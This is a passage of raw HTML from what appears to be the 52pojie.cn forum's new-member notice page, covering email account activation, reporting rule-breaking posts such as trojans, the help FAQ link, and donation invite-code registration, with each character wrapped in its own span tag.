initial;">坛</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">载</span><span style="display: inline-block; text-indent: initial;">附</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">掉</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">何</span><span style="display: inline-block; text-indent: initial;">操</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span></span></strong><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li></ol><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">奖</span></h2><p style="margin-bottom: 0px; color: rgb(53, 53, 53);"><span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">热</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">积</span><span style="display: inline-block; text-indent: initial;">极</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">协</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">斑</span><span style="display: inline-block; text-indent: initial;">竹</span><span style="display: inline-block; text-indent: initial;">巡</span><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">勤</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">益</span><span style="display: inline-block; text-indent: initial;">恢</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">灌</span><span style="display: inline-block; text-indent: initial;">水</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">冒</span><span style="display: inline-block; text-indent: initial;">充</span><span style="display: inline-block; text-indent: initial;">别</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">品</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">甚</span><span style="display: inline-block; text-indent: initial;">至</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">木</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">层</span><span style="display: inline-block; text-indent: initial;">出</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">穷</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">虽</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">反</span><span style="display: inline-block; text-indent: initial;">病</span><span style="display: inline-block; text-indent: initial;">毒</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">师</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">够</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">与</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">责</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">尽</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">份</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">u</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">站</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">文</span><span style="display: inline-block; text-indent: initial;">档</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">般</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">找</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">！</span></strong><strong><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">?</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">=</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">q</span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">相</span><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">明</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p><span style="color: rgb(255, 0, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">捐</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">赠</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币</span><span style="display: inline-block; text-indent: initial;">价</span><span style="display: inline-block; text-indent: initial;">值</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">元</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">且</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">险</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">滴</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">【</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">】</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">[</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">]</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">样</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p><span style="background-color: rgb(255, 255, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">并</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">意</span><span style="display: inline-block; text-indent: initial;">味</span><span style="display: inline-block; text-indent: initial;">着</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">已</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">录</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: 